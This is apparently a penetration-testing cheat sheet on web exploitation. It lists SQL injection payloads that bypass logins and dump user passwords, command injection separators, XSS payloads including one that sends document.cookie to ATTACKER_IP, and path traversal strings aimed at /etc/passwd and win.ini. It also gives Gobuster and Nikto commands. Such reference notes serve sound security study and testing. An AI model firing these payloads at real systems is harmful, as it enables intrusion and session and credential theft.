# 🌐 Web Exploitation

*Techniques for breaking web applications.*

## 💉 Injection Attacks

### SQL Injection (SQLi)
*Manipulate the database query.*

| Type | Pattern | Payload Example |
| :--- | :--- | :--- |
| **Auth Bypass** | `' OR 1=1` | `admin' OR 1=1 --` |
| **Union Based** | `UNION SELECT` | `' UNION SELECT user, password FROM users --` |
| **Comment Out** | `--` or `#` | `admin' #` |

### Command Injection
*Execute OS commands via the web app.*

| Separator | Example | Description |
| :--- | :--- | :--- |
| `;` | `127.0.0.1; id` | Run command after the first one finishes. |
| `|` | `127.0.0.1 | id` | Pipe output (might break flow). |
| `&&` | `127.0.0.1 && id` | Run only if first command succeeds. |
| `$()` | `$(id)` | Inline execution. |

### Cross-Site Scripting (XSS)
*Execute Javascript in the victim's browser.*

```html
<script>alert(1)</script>

<img src=x onerror=alert(1)>

<script>fetch('http://ATTACKER_IP/?cookie=' + document.cookie)</script>
```

---

## 🤖 AI & LLM Exploitation
*Testing for logic flaws in chatbots and AI models.*

| Tool | Link | Description |
| :--- | :--- | :--- |
| **OWASP LLM Top 10** | [OWASP GenAI](https://genai.owasp.org/llm-top-10/) | Standard resource for testing AI logic flaws and injection. |

---

## 📂 Directory Traversal
Access files outside the web root.

* `../../../../etc/passwd`
* `..%2f..%2f..%2fwindows/win.ini` (URL Encoded)

---

## 🧰 Tools
| Tool | Description |
| :--- | :--- |
| **Burp Suite** | The gold standard proxy. Intercept and modify requests. |
| **Gobuster** | `gobuster dir -u <url> -w <wordlist>` (Find hidden folders). |
| **Nikto** | `nikto -h <url>` (Scan for outdated software/vulns). |